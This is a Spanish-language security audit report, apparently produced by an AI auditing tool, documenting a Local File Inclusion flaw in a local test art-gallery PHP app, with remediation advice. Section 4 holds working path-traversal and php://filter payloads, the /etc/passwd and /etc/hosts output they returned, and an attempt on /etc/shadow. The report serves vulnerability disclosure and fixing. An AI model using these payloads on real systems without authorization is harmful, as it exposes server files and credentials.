# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30  
**Objetivo:** http://web.dev.local:8081  
**Analista:** Copilot Security Audit  
**Tipo de análisis:** Local File Inclusion (LFI)

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor, incluyendo archivos de configuración sensibles.

**Resultado:** ✅ Vulnerabilidad encontrada y explotada.

---

## 2. Descripción de la Aplicación

La aplicación es una galería de arte virtual que presenta las siguientes rutas:

- `http://web.dev.local:8081/` — Página principal (`index.php`)
- `http://web.dev.local:8081/gallery.php?page=modern` — Arte Moderno
- `http://web.dev.local:8081/gallery.php?page=classic` — Arte Clásico
- `http://web.dev.local:8081/gallery.php?page=abstract` — Arte Abstracto
- `http://web.dev.local:8081/gallery.php?page=about` — Acerca de

---

## 3. Vulnerabilidad Identificada

### 3.1 Local File Inclusion (LFI) — CWE-98 / OWASP A05:2021

**Archivo vulnerable:** `/var/www/html/gallery.php`  
**Parámetro vulnerable:** `page`  
**Línea de código afectada:** Línea 104 (confirmado por mensaje de error PHP)  

**Descripción:**  
El parámetro `page` del script `gallery.php` es utilizado directamente en una función `include()` de PHP sin sanitización ni validación adecuada. Esto permite a un atacante utilizar secuencias de traversal de directorios (`../`) para incluir archivos arbitrarios del sistema de ficheros.

---

## 4. Explotación

### 4.1 Payload básico - Traversal de directorios

**URL de prueba:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado exitoso:** El servidor devolvió el contenido completo de `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Payload alternativo - Ruta absoluta

**URL de prueba:**
```
http://web.dev.local:8081/gallery.php?page=/etc/passwd
```

**Resultado:** También exitoso — el servidor acepta rutas absolutas directamente.

### 4.3 Lectura de /etc/hosts

**URL:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
fe00::      ip6-localnet
ff00::      ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
172.19.0.2  d5054e367753
```

Esto revela la dirección IP interna del contenedor (`172.19.0.2`) y el hostname (`d5054e367753`).

### 4.4 Intento de lectura de /etc/shadow

**URL:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/shadow
```

**Resultado:** Fallido — el servidor web (`www-data`) no tiene permisos de lectura sobre `/etc/shadow`. Sin embargo, el mensaje de error confirma la ruta del archivo fuente: `/var/www/html/gallery.php` en la línea 104.

### 4.5 PHP Wrappers (php://filter)

**URL:**
```
http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
```

**Resultado:** Fallido — el servidor valida o filtra wrappers de PHP, impidiendo la lectura de código fuente PHP mediante este método.

---

## 5. Análisis de Impacto

| Aspecto | Evaluación |
|---------|------------|
| **Confidencialidad** | ALTA — lectura de archivos del sistema |
| **Integridad** | BAJA — solo lectura, no escritura |
| **Disponibilidad** | BAJA — no afecta directamente |
| **CVSS Base Score** | ~7.5 (High) |

**Información sensible accesible:**
- Lista de usuarios del sistema (`/etc/passwd`)
- Configuración de red interna (`/etc/hosts`)
- Archivos de configuración de la aplicación web
- Potencialmente: claves SSH, archivos `.env`, configuraciones de bases de datos

---

## 6. Causa Raíz

El código PHP vulnerable utiliza el parámetro `page` directamente en `include()` sin:
1. Validar la entrada contra una lista blanca de páginas permitidas
2. Sanitizar secuencias de traversal (`../`)
3. Restringir la ruta base mediante `realpath()` o similar
4. Desactivar wrappers de URL en la configuración PHP

**Código vulnerable (aproximado):**
```php
$page = $_GET['page'];
include($page); // Sin validación
```

---

## 7. Recomendaciones

1. **Lista blanca de páginas:** Validar el parámetro contra un array de valores permitidos:
   ```php
   $allowed = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($_GET['page'], $allowed)) { die('Página no válida'); }
   include('pages/' . $_GET['page'] . '.php');
   ```

2. **Usar `basename()`:** Eliminar componentes de ruta del input:
   ```php
   $page = basename($_GET['page']);
   ```

3. **Configuración PHP:** Deshabilitar `allow_url_include` en `php.ini`.

4. **Open_basedir:** Configurar `open_basedir` para restringir el acceso a directorios específicos.

5. **Principio de mínimo privilegio:** El proceso web no debe tener acceso a archivos del sistema fuera del webroot.

---

## 8. Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad crítica de **Local File Inclusion** en el parámetro `page` del archivo `gallery.php`. La explotación es trivial y permite la lectura de archivos sensibles del sistema sin autenticación. Se recomienda remediar la vulnerabilidad con urgencia implementando validación por lista blanca.

---

*Informe generado automáticamente mediante análisis de seguridad autorizado.*
